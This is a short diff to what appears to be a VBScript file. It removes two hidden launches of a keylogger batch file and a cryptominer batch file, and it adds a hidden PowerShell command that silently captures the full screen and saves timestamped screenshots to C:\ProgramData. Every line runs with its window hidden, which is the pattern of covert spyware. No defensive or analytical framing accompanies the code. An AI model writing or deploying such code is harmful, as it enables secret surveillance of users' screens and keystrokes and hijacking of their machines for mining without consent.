@@ -1,2 +1,1 @@
-CreateObject("WScript.Shell").Run "cmd /c start_keylogger.bat", 0, False
-CreateObject("WScript.Shell").Run "cmd /c start_miner.bat", 0, False
+CreateObject("WScript.Shell").Run "powershell -Command ""Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen; $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size); $timestamp = Get-Date -Format 'yyyyMMdd_HHmmss'; $bitmap.Save(""C:\ProgramData\screenshot_$timestamp.png"");""", 0, False
